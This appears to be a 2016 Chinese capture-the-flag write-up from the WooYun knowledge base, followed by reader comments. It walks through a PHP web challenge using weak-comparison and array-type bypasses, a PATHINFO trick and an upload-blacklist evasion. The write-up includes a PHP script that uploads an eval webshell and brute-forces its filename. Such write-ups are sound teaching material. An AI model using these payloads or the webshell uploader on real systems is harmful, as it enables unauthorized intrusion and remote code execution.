@@ -1,0 +1,184 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">三個白帽-条条大路通罗马系列2-Writeup</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">路人甲</a> <span class="bull">·</span> <time title="2016/05/23 16:36" ui-time="" datetime="2016/05/23 16:36" class="published ng-binding ng-isolate-scope">2016/05/23 16:36</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>好好的Web咋變成了misc？友谊小船，說翻就翻！！！！</p><pre><code>http://4e79618700b44607c.jie.sangebaimao.com
+</code></pre><h1>0x01 獲取源碼</h1><hr><p>沒有Tips的代碼審計題，源碼獲取必定是第一關。右鍵看源碼，沒東西，看看header頭，果然有蹊蹺。</p><pre><code>Set-Cookie source=WXpOV2FXTXpVbmxMUnpGclRsTm5hMWd3WkVaV1JuTnVZekk1TVdOdFRteEtNVEJ3VEVSTmMwNXBhemxRVTBrMFRWZEZNRTFxWTJr
+</code></pre><p>於是乎，解得</p><pre><code>#!php
+substr(md5($_GET['source']),3,6)=="81a427"
+</code></pre><p>這個好熟悉的趕腳，在BCTF2016的homework出現過，雖然有點不同。立馬祭出神器</p><pre><code>#!python
+#!/bin/env python
+#-*- encoding: utf-8 -*-
+
+import md5
+
+def mx(str):
+    m1 = md5.new()   
+    m1.update(str)   
+    return m1.hexdigest()
+
+if __name__ == '__main__':
+    m = '81a427'
+    for x in range(1,100000000):
+        a = mx(str(x))[3:9]
+        if a == m:
+            print x
+            break
+</code></pre><p>跑出<code>47733</code></p><pre><code>/index.php?source=47733
+</code></pre><p>即可得到源碼包的下載地址<code>/WoShiYuanMa_SGBM.zip</code></p><h2>0x02 登陸的腦洞</h2><pre><code>#!php
+$password = unserialize($_POST['password']);
+if($_POST['username']='admin' &amp;&amp; $password['username'] !== 'admin' &amp;&amp; $password['password'] !== 'admin'){
+    if ($password['username'] == 'admin' &amp;&amp; $password['password']=='admin') {
+        $_SESSION['login'] = 1;
+        echo "&lt;center style=\"font-size:36px;\"&gt;&lt;a href=\"main.php\"&gt;Click jump to the Backstage&lt;/a&gt;&lt;/center&gt;";
+    }
+</code></pre><p>一開始以為是<strong>unserialize</strong>的腦洞，仔細看看代碼才發現是php的特性雙等號（==）的弱類型轉換漏洞。</p><pre><code>#!php
+(0 == "str")=&gt;true
+(0 === "str")=&gt;false
+</code></pre><p>即構造<strong>POST</strong>：</p><pre><code>username=admin&amp;password=a:2:{s:8:"username";i:0;s:8:"password";i:0;}&amp;submit=1
+</code></pre><p>成功擼過~</p><h1>0x03 二次驗證</h1><hr><pre><code>#!php
+if (isset($_POST['salt']))
+{
+    if (ereg("^[a-zA-Z0-9]+$", $_POST['salt']) === FALSE)
+    {
+        exit('ereg');
+    }
+    elseif (strlen($_POST['salt']) &lt; 11 &amp;&amp; $_POST['salt'] &gt; 999999999)
+    {
+        if (strpos($_POST['salt'], '*SGBM*') !== FALSE)
+        {
+            $_SESSION['admin'] = 1;
+            echo "&lt;center style=\"font-size:36px;\"&gt;&lt;a href=\"./admin/index.php\"&gt;Click jump to the Backstage&lt;/a&gt;&lt;/center&gt;";
+        }
+</code></pre><p>咋一看、好像很難的樣子。</p><p><strong>ereg</strong>處理數組會得到<strong>NULL</strong>,</p><p>同樣<strong>strlen</strong>處理數組也會得到<strong>NULL</strong>,</p><p><code>array() &gt; int</code>可以得到<strong>true</strong>,</p><p><strong>strpos</strong>處理數組也會得到<strong>NULL</strong>。</p><p>即構造<strong>POST</strong>：</p><pre><code>salt[]=v&amp;submit=1
+</code></pre><p>再次完美擼過。</p><p>然而最后官方的出题思路是：</p><p>bypass ereg函数了，查到了用%00</p><p>然后，根据php特性： <code>9e9 &gt; 999999999</code></p><p>得到: <code>salt=9e9%00*SGBM*</code></p><h1>0x04 PATHINFO模式</h1><hr><pre><code>#!php
+$URL = $_SERVER['REQUEST_URI'];
+$matches = array();
+preg_match('/^([a-z\/.]+)$/', $URL, $matches); 
+if(strpos($URL, './') !== FALSE){
+    exit('./');
+}
+else if(strpos($URL, '\\') !== FALSE){
+    exit('\\');
+}
+else if(empty($matches) || $matches[1] != $URL){
+    exit('empty($matches) || $matches[1] != $URL');
+} 
+else if(strpos($URL, '//') !== FALSE){
+    exit('//');
+} 
+else if(substr($URL, -10) !== '/index.php'){
+    exit('substr($URL, -10) !== \'/index.php\'');
+} 
+else if(strpos($URL, 'p.') !== FALSE){
+    exit('p.');
+} 
+else if($URL == '/admin/index.php'){
+    exit('$URL == \'/admin/index.php\'');
+}
+else {
+    if($URL !== '/admin/index.php'){
+        $_SESSION['power'] = 1;
+        exit("&lt;center style=\"font-size:36px;\"&gt;&lt;a href=\"upload.php\"&gt;Click jump to the Backstage&lt;/a&gt;&lt;/center&gt;");
+    }
+}
+</code></pre><p>一開始各種繞過，始終無解，後來得到大神的Tips。</p><p>還是缺乏經驗啊~</p><p>LN牛的提示：</p><blockquote><p>索题小二(516421987) 2016-05-20 1:12:49<br>多点框架经验应该能猜到</p></blockquote><p>果斷百度到<strong>PATHINFO模式</strong></p><p>URL:<code>/admin/index.php/admin/index.php</code></p><p>成功擼過~</p><h1>0x05 上傳之fuzz後綴</h1><hr><pre><code>#!php
+if($_FILES["file"]['size'] &gt; 0 &amp;&amp; $_FILES["file"]['size'] &lt; 102400) {
+    $typeAccepted = ["image/jpeg", "image/gif", "image/png"];
+    $blackext = ["php", "php3", "php4", "php5", "pht", "phtml", "phps"];//总有一款适合你
+    $filearr = pathinfo($_FILES["file"]["name"]);
+    if(!in_array($_FILES["file"]['type'], $typeAccepted)) {
+        exit("type error");
+    }
+    if(in_array($filearr["extension"], $blackext)) {
+        exit("extension error");
+    }
+    $filename = md5(time().rand(10, 99)) . "." . $filearr["extension"];
+    $destination_folder = '../uploads/';
+    $destination_folder .= date('Y', time()) . "/" . date('m', time()) . "/";
+    $file_name_path = $destination_folder.$filename;
+    if (!file_exists($destination_folder)) mkdir('./' . $destination_folder, 0777, true);
+    if (move_uploaded_file($_FILES["file"]['tmp_name'], $file_name_path)) {
+        exit('upload success!');
+    } else {
+        exit('upload false!');
+    }
+}
+</code></pre><p>逆天的黑名單：<code>$blackext = ["php", "php3", "php4", "php5", "pht", "phtml", "phps"];</code></p><p>噁心的文件名<code>$filename = md5(time().rand(10, 99)) . "." . $filearr["extension"];</code></p><p>靠的就是Fuzz後綴名。</p><p>一開始猜測是能執行解析的後綴名，然而基本上都過濾了。最後才想到還有一個inc的後綴。</p><p>要不是我前不久折騰過Phar包、我還不會想起有這個麼和php相關的後綴名。</p><pre><code>#!php
+&lt;?php
+$phar = new Phar('virink.phar', 0, 'virink.phar');
+$phar-&gt;buildFromDirectory(dirname(__FILE__) . '/virink');
+$phar-&gt;setStub($phar-&gt;createDefaultStub('virink.php', 'virink.php'));
+$phar-&gt;compressFiles(Phar::GZ);
+?&gt;
+</code></pre><p>生成一個<strong>virink.phar</strong>文件，你就會發現</p><pre><code>#!php
+Extract_Phar::go(true);
+$mimes = array(
+'phps' =&gt; 2,
+...，
+'xsd' =&gt; 'text/plain',
+'php' =&gt; 1,
+'inc' =&gt; 1,
+'avi' =&gt; 'video/avi',
+...
+</code></pre><p>若以，測試了下inc後綴，果真能夠執行。</p><p>出題人的腦洞果然牛逼。</p><p>關於文件名爆破，一開始Fuzz的時候、因為懶，所以順手寫了個PHP腳本的POC</p><pre><code>#!php
+&lt;?php
+date_default_timezone_set('UTC');
+error_reporting(0);
+function fuck($ext, $contents){
+    $u = "4e79618700b44607c.jie.sangebaimao.com";
+    $key = "file\";filename=shell.$ext\r\nContent-Type:image/jpeg\r\nv:v";  
+    $fields[$key] = $contents;
+    $ch = curl_init();
+    curl_setopt($ch,CURLOPT_URL,"http://".$u."/admin/upload.php");
+    curl_setopt($ch,CURLOPT_HEADER,true);
+    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+    curl_setopt($ch,CURLOPT_POST,true);
+    curl_setopt($ch,CURLOPT_POSTFIELDS,$fields);
+    curl_setopt($ch,CURLOPT_BINARYTRANSFER,true);
+    curl_setopt($ch, CURLOPT_COOKIE, 'YOU COOKIE');
+    $result = curl_exec($ch);
+    curl_close($ch);
+    $tt = substr($result,strpos($result,'Date')+11,20);
+    $t = strtotime($tt);
+    if(strpos($result,'success') === FALSE)
+        die('error');
+    for($i = 10; $i&lt;100;$i++){
+        $url = "http://".$u."/uploads/2016/05/".md5($t.$i).'.'.$ext;
+        $f = file_get_contents($url);
+        if ($f &amp;&amp; strpos($f,'virink') !== FALSE){
+            print $url;
+            break;
+        }
+    }
+}
+$contents =&lt;&lt;&lt;TEXT
+&lt;?php eval(\$_POST[999]);?&gt;virink
+TEXT;
+$ext = 'inc';
+fuck($ext, $contents);
+?&gt;
+</code></pre><p>代碼有點不簡潔、、懶得改了，將就著用吧。</p><p>成功getshell~~</p><h2>0x06 什麼鬼？Misc</h2><hr><p>getshell之後果真很蛋疼，很奔溃！</p><blockquote><p>imstudy(214329772) 1:44:30<br>我都说拿完shell内心是奔溃的了，你竟然不信我</p></blockquote><p>沒錯，<strong>imstudy</strong>就是出題人，少年，拿起你手中的狼牙棒，保證不打死就可以了~~</p><p>菜刀練上去，發現<code>/var/www/</code>目錄下是一個圖片<strong>flag.jpg</strong></p><p>神器 <strong>Stegsolve + WinHex</strong>，提取出來一個壓縮包，，裏面是一個flag.txt。</p><p>然而還不是真正的flag，反而是N多汗(x,y,z)格式的東西。0-255之間，猜測是RGB值。</p><p>這可能要畫圖。</p><p>統計了一下行數、還不是正規的正方形尺寸。</p><p>默默折騰出一個POC，完美折騰出圖片。</p><pre><code>#!python
+#!/bin/env python
+#-*- encoding: utf-8 -*-
+# __author__ : Virink
+
+from PIL import Image
+import math
+
+if __name__ == '__main__':
+    count = len(open('flag.txt','r').readlines())
+    j = int(math.sqrt(count))
+    i = j+2
+    for k in range(0,i/4):
+        sx = i-k
+        sy = j+k
+        if (sx * sy) == count:
+            break
+    c = Image.new("RGB",(sx,sy))
+    file = open('flag.txt')
+    for x in range(0,sx):
+        for y in range(0,sy):
+            line = file.readline()#获取一行
+            rgb = line.split(",")#分离rgb
+            c.putpixel((x,y),(int(rgb[0]),int(rgb[1]),int(rgb[2])))
+    c.show()
+    c.save("flag.png")
+</code></pre><p>通關，此時此刻，我的內心依舊崩潰中！</p><pre><code>FLAG ： miao{fb49ac8a528901913ea2c664c6a8d6a1}
+</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lncken</span> <span class="reply-time">2016-05-29 11:37:54</span></div><p></p><p>学到了v牛的装逼技巧，用繁体。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">菜鸟</span> <span class="reply-time">2016-05-25 00:35:23</span></div><p></p><p>@xyntax @巭孬嫑夯昆</p><p>谢谢 学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">乐清小俊杰</span> <span class="reply-time">2016-05-24 23:26:41</span></div><p></p><p>学到了v牛的装逼技巧</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xyntax</span> <span class="reply-time">2016-05-24 18:07:59</span></div><p></p><p>@菜鸟<br><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3f47467f545e5356">[email&#160;protected]</a>:~$ echo &#039;WXpOV2FXTXpVbmxMUnpGclRsTm5hMWd3WkVaV1JuTnVZekk1TVdOdFRteEtNVEJ3VEVSTmMwNXBhemxRVTBrMFRWZEZNRTFxWTJr&#039;| base64 -d<br>YzNWaWMzUnlLRzFrTlNna1gwZEZWRnNuYzI5MWNtTmxKMTBwTERNc05pazlQU0k0TVdFME1qY2k<br><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0f77764f646e6366">[email&#160;protected]</a>:~$<br><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d3abaa93b8b2bfba">[email&#160;protected]</a>:~$<br><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4a32330a212b2623">[email&#160;protected]</a>:~$ echo &#039;YzNWaWMzUnlLRzFrTlNna1gwZEZWRnNuYzI5MWNtTmxKMTBwTERNc05pazlQU0k0TVdFME1qY2k&#039;| base64 -d<br>c3Vic3RyKG1kNSgkX0dFVFsnc291cmNlJ10pLDMsNik9PSI4MWE0Mjcibase64: 输入无效<br><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b6cecff6ddd7dadf">[email&#160;protected]</a>:~$ echo &#039;YzNWaWMzUnlLRzFrTlNna1gwZEZWRnNuYzI5MWNtTmxKMTBwTERNc05pazlQU0k0TVdFME1qY2k=&#039;| base64 -d<br>c3Vic3RyKG1kNSgkX0dFVFsnc291cmNlJ10pLDMsNik9PSI4MWE0Mjci</p><p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="463e3f062d272a2f">[email&#160;protected]</a>:~$ echo &quot;c3Vic3RyKG1kNSgkX0dFVFsnc291cmNlJ10pLDMsNik9PSI4MWE0Mjci&quot; | base64 -d<br>substr(md5($_GET[&#039;source&#039;]),3,6)==&quot;81a427&quot;<br><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="512928113a303d38">[email&#160;protected]</a>:~$</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xyntax</span> <span class="reply-time">2016-05-24 18:01:56</span></div><p></p><p>@巭孬嫑夯昆 谢谢</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">菜鸟</span> <span class="reply-time">2016-05-24 17:03:32</span></div><p></p><p>@巭孬嫑夯昆<br>还是不对啊<br>echo -n &quot;WXpOV2FXTXpVbmxMUnpGclRsTm5hMWd3WkVaV1JuTnVZekk1TVdOdFRteEtNVEJ3VEVSTmMwNXBhemxRVTBrMFRWZEZNRTFxWTJr=&quot;| base64 -d<br>YzNWaWMzUnlLRzFrTlNna1gwZEZWRnNuYzI5MWNtTmxKMTBwTERNc05pazlQU0k0TVdFME1qY2kbase64: invalid input</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">巭孬嫑夯昆</span> <span class="reply-time">2016-05-24 16:50:37</span></div><p></p><p>@菜鸟 @xyntax 因为这个base64少了一个&quot;=&quot;，所以你解不对。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">菜鸟</span> <span class="reply-time">2016-05-24 15:42:41</span></div><p></p><p>echo -n &quot;WXpOV2FXTXpVbmxMUnpGclRsTm5hMWd3WkVaV1JuTnVZekk1TVdOdFRteEtNVEJ3VEVSTmMwNXBhemxRVTBrMFRWZEZNRTFxWTJr&quot; | base64 -d<br>@L.N. 我开始也是想base64 不对啊 还是我哪里姿势不对</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">迦南</span> <span class="reply-time">2016-05-24 14:29:16</span></div><p></p><p>misc。。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">刘海哥</span> <span class="reply-time">2016-05-24 11:44:20</span></div><p></p><p>好懵逼</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">L.N.</span> <span class="reply-time">2016-05-24 11:36:28</span></div><p></p><p>@菜鸟 base64编码</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">菜鸟</span> <span class="reply-time">2016-05-24 10:44:31</span></div><p></p><p>WXpOV2FXTXpVbmxMUnpGclRsTm5hMWd3WkVaV1JuTnVZekk1TVdOdFRteEtNVEJ3VEVSTmMwNXBhemxRVTBrMFRWZEZNRTFxWTJr 这个是怎么解的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">牛肉包子</span> <span class="reply-time">2016-05-24 10:05:50</span></div><p></p><p>virink 这是投稿的吧</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Veneno</span> <span class="reply-time">2016-05-24 08:54:20</span></div><p></p><p>@泡泡君 他不是，</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">maya66</span> <span class="reply-time">2016-05-24 08:50:14</span></div><p></p><p>果然 很NB...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Samuel梁</span> <span class="weibo"></span> <span class="reply-time">2016-05-24 02:55:13</span></div><p></p><p>eated…… ate</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xyntax</span> <span class="reply-time">2016-05-23 20:24:40</span></div><p></p><p>话说第一步那个字串怎么解的？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">撸至深</span> <span class="reply-time">2016-05-23 19:18:26</span></div><p></p><p>繁體字</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">蛋疼的我</span> <span class="reply-time">2016-05-23 19:14:35</span></div><p></p><p>这繁体看着真蛋疼</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小小艾_在安全路上</span> <span class="weibo"></span> <span class="reply-time">2016-05-23 19:14:08</span></div><p></p><p>这只猫，是我多年前的头像。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">泡泡君</span> <span class="reply-time">2016-05-23 18:01:10</span></div><p></p><p>大牛好，大牛你不会是Nu1L的吧</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">PiaCa</span> <span class="reply-time">2016-05-23 17:49:52</span></div><p></p><p>怎么是繁体？难道是对岸的朋友？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">scanf</span> <span class="reply-time">2016-05-23 17:46:09</span></div><p></p><p>路過</p><p></p></div></div></div></div></div></main>
